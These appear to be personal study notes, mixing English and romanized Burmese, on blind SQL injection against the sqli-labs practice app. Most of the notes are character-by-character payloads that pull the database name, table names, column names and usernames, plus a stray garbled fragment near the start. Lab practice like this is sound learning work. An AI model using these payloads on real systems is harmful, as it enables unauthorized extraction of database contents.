1. boolean base        and 1=1 (must true)    |  and . jl,,,,,,,,zcn
   1=2 (must be false)  |   'a'='a'(true)   | 'a'='b'(false)"
https://pastebin.com/gaSQ3KCH   => ko root note?"



2. time base   #### The most poweful in sql injection
![[Pasted image 20230131210348.png]]

![[Pasted image 20230131210539.png]]
Ta chot nay yar dwe mar space ka a lote ma lote bu so we use + sign  like upper example


![[Pasted image 20230131211040.png]]
time base ko condition net check dar


---->time base ka nay data pyan htoke dar -> ko root payload dwe use htar dwal

![[Pasted image 20230131211556.png]]




---

ko root note 

1' AND 1=1--+ == True

1' AND 1=0--+ == False

for version check

1' AND (ascii(substr((select version()),1,1))) = 53 --+ // 53 = 5

for database lenght check

1' AND (ascii(substr((select length(database())),1,1))) = 56--+ //56 = 8

for database check

1' AND (ascii(substr((select database()),1,1))) = 115 --+ //115 = s

1' AND (ascii(substr((select database()),2,1))) = 101 --+ //101 = e

1' AND (ascii(substr((select database()),3,1))) = 99 --+ //99 = c

1' AND (ascii(substr((select database()),4,1))) = 117--+ // u

1' AND (ascii(substr((select database()),5,1))) = 114--+ // r

1' AND (ascii(substr((select database()),6,1))) = 105--+ // i

1' AND (ascii(substr((select database()),7,1))) = 116--+ // t

1' AND (ascii(substr((select database()),8,1))) = 121 --+ //121 = y

for all table count

http://localhost/sqli-labs-master/Less-8/?id=1' AND (ascii(substr((select count(*) from information_schema.tables where table_schema=database() limit 0,1),1,1))) = 52 --+ // 52 = 4

Table length check

1' AND (ascii(substr((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1),1,1))) = 54 --+ // 54 = 6

for table first columns

1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))) = 101 --+ // e

1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))) = 109 --+ // m

1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))) = 97 --+ // a

1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),4,1))) = 105 --+ // i

1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),5,1))) = 108 --+ // l

1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1))) = 115 --+ // s

for table second columns

1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))) = 114 --+

for table third columns

1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),1,1))) = 117 --+

for table fourth columns length

1' AND (ascii(substr((select length(table_name) from information_schema.tables where table_schema=database() limit 3,1),1,1))) = 53 --+ // 5

for table foruth columns

1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))) = 117 --+ // u

1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1))) = 115 --+ // s

1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),3,1))) = 101 --+ // e

1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),4,1))) = 114 --+ // r

1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),5,1))) = 115 --+ // s

Next Column

1' AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="users" and table_schema=database() LIMIT 0,1),1,1))) = 117 --+ //u

1' AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="users" and table_schema=database() LIMIT 0,1),2,1))) = 115 --+ //s

1' AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="users" and table_schema=database() LIMIT 0,1),3,1))) = 101 --+ //e

1' AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="users" and table_schema=database() LIMIT 0,1),4,1))) = 114 --+ //r

1' AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="users" and table_schema=database() LIMIT 0,1),5,1))) = 95 --+ //_

Or

1' AND (ascii(substr((select concat(column_name)+from+information_schema.columns+where+table_name=0x7573657273 limit 3,1),1,1))) = 117 --+ //u

1' AND (ascii(substr((select concat(column_name)+from+information_schema.columns+where+table_name=0x7573657273 limit 3,1),2,1))) = 115 --+ //s

1' AND (ascii(substr((select concat(column_name)+from+information_schema.columns+where+table_name=0x7573657273 limit 3,1),3,1))) = 101 --+ //e

1' AND (ascii(substr((select concat(column_name)+from+information_schema.columns+where+table_name=0x7573657273 limit 3,1),4,1))) = 114 --+ //r

Dump

1' AND (ascii(substr((SELECT username FROM security.users LIMIT 0,1),1,1))) = 68 --+ //D

1' AND (ascii(substr((SELECT username FROM security.users LIMIT 0,1),2,1))) = 117--+ //u

1' AND (ascii(substr((SELECT username FROM security.users LIMIT 0,1),3,1))) = 109 --+//m

1' AND (ascii(substr((SELECT username FROM security.users LIMIT 0,1),4,1))) = 98 --+ //b



